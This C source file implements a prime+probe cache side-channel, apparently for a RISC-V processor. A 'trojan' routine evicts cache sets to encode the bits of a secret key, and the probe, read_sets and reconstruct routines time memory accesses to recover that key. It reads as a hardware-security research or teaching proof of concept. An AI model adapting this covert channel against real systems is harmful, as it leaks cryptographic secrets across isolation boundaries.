/***NOT TESTED ON VERILATOR*****/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define CACHE_SETS 256
#define CACHE_WAYS 8
#define CACHE_LINE_SIZE 16
#define cache_size (CACHE_SETS * CACHE_WAYS * CACHE_LINE_SIZE) / CACHE_LINE_SIZE

#define iterations 200 	//number of times to run the prime and probe attack
#define threshold 30	//threshold above which we have a cache miss
	
volatile unsigned miss[cache_size] = {0};	//array which holds the misses of each cache line



/********helper function to convert string to bits**********/

char* stringToBinary(char* s) {
    if(s == NULL) return 0; /* no input string */
    size_t len = strlen(s);   
    char *binary = malloc(len*8 + 1); // each char is one byte (8 bits) and + 1 at the end for null terminator
    binary[0] = '\0';   
    for(size_t i = 0; i < len; ++i) {
        char ch = s[i];
        for(int j = 7; j >= 0; --j){
            if(ch & (1 << j)) {
                strcat(binary,"1");
            } else {
                strcat(binary,"0");
            }
        }
    }
    return binary;
}




/*************PRIME FUNCTION******************/

void prime(__uint128_t *array){
	__uint128_t temp = 1;
	//fill the cache with arbitrary data
	for (int i = 0 ; i < cache_size ; i++ ){
		array[i] = 16;		
		temp = array[i];	//read it in order to load the array into the cache
	}
}



/*************PROBE FUNCTION******************/

void probe(__uint128_t *array){
	__uint128_t temp = 1;	//temp variable to read the array data in order to load them into the cache
	register unsigned long start,end,diff;	//variables to measure access time
	for ( int i = 0 ; i < cache_size ; i++){
		asm volatile ("rdcycle %0" : "=r" (start));
		temp = array[i];
		asm volatile ("rdcycle %0" : "=r" (end));
		diff = end - start;
		if(diff > threshold){
			miss[i]++;
		}
	}
}



/**************TROJAN CODE*********************/

void trojan(char *key){
	//trojan will evict specific cache lines according to the bits of the secret key
	__uint128_t trojan_array[cache_size] __attribute__((aligned(128)));
	__uint128_t temp = 16;
	int i , j ;
	//transform the key into bits
	char* key_bits;
	key_bits = stringToBinary(key);
	size_t keylength = strlen(key_bits);
	//we can encrypt a key of upto 240 bits because we skip 8 bits from sets 88-95 and we lose 8 bits because the prime array is 8 sets ahead of the trojan array	
	if ( keylength > 240){
		printf("Key is too big to encrypt");
	}
	else{
		//evict the sets starting from 0 if the bit of the key is 1, otherwise dont evict
		for ( j = 0 ; j < cache_size ; j++){
			if( j % 256 == 0 ){		//evict all ways of the same set
				for ( i = 0 ; i < keylength; i++){
					//evict at position j+i (set 0 for first bit, set 1 for second bit, etc.)				
					if (key_bits[i] == '1'){
						if ( i > 87 ){		//we cant use the octave of cache sets 88 - 95, because 88 gets always evicted no matter what
							trojan_array[j+i+8+8] = 150;	//we skip over the cache sets 88 - 95 by adding an extra 8 indexes
							temp = trojan_array[j+i+8+8];	
						}
						else{
							trojan_array[j+i+8] = 150;
							temp = trojan_array[j+i+8];	//add 8 to get to the same set as the prime_array
						}
					}
				}
			}
		}
	}	
}


/*************VICTIM FUNCTION******************/

void victim(){
	char *key = "SecretKey";
	trojan(key);
}


/**************function to reconstruct the secret key***************/

void reconstruct(int *bin_key){
	int octave = 0 ;	//specifies the octave of bits we are decoding
	char *decoded_key = (char *)malloc((octave+1)*sizeof(char));	//alocate memory for 1 character

	//keep decoding untill we hit 8 bits of 0 which indicate end of string or we have read the entire bin_key array
	//because set 88 is always evicted we have to ignore bits 88 to 95 which is the 11th octave
	int end = 0 ;
	int num, z, j;
	while(end == 0 || octave == 31){		//we can read upto 31 characters because the bin_key is of size 256 and we skip the 11th octave
		num = 0 ;
		z = 0;
		if(octave>10){		//when we reach octave 11 we skip it
			for (j = 7 ; j >= 0 ; j --){
				num = num + (bin_key[((octave+1)*8)+j] << z);	//calculate ascii code of the character
				z++;
			}	
		}
		else{
			for (j = 7 ; j >= 0 ; j --){
				num = num + (bin_key[(octave*8)+j] << z);
				z++;
			}
		}
		if ( num != 0 ){	//check if we reached end of string
			decoded_key[octave] = num;
			octave++;
			decoded_key = realloc(decoded_key,((octave+1)*sizeof(char)));
		}
		else {
			decoded_key[octave] = '\0';
			end = 1;
		}	
	
	}

	printf("Decoded key is %s\n",decoded_key);
}




/***********function to read the evicted sets***************/

void read_sets(){
	int i = 0;
	int evicted_ways[256] = {0};	//keep amount of way evictions in each set
	int evictions = 0 ;
	//find out how many ways of each set got evicted
	for(i = 0 ; i < cache_size ; i++){
		int way = i/256;
		int set = i - (way*256);
		if(miss[i] > 150){
			//printf("Index %d, Cache way %d, Set %d got evicted %d times\n",i,way,set,miss[i]);
			evicted_ways[set]++;
			evictions++;
		}
		
	}

	int total_sets_evicted = 0 ;
	int set_evicted[256] = {0};	//array which specifies which sets are evicted and which not
	//if a set got at least 7 of its 8 ways evicted then its an evicted set
	for(i = 0 ; i < 256; i++){
		if(evicted_ways[i] > 6){
			printf("Set %d got %d evictions\n",i,evicted_ways[i]);
			total_sets_evicted++;
			set_evicted[i] = 1;
		}
	}

	printf("Total evictions %d\n",evictions);
	printf("Total sets evicted %d\n",total_sets_evicted);

	reconstruct(set_evicted);
}






int main(){
	__uint128_t prime_array[cache_size] __attribute__((aligned(128))); //define array the size of the cache

	for (int i = 0 ; i < iterations ; i ++){
		prime(prime_array);		//prime the cache
		victim();
		probe(prime_array);		//probe the cache
	}

	read_sets();

	return 0;

}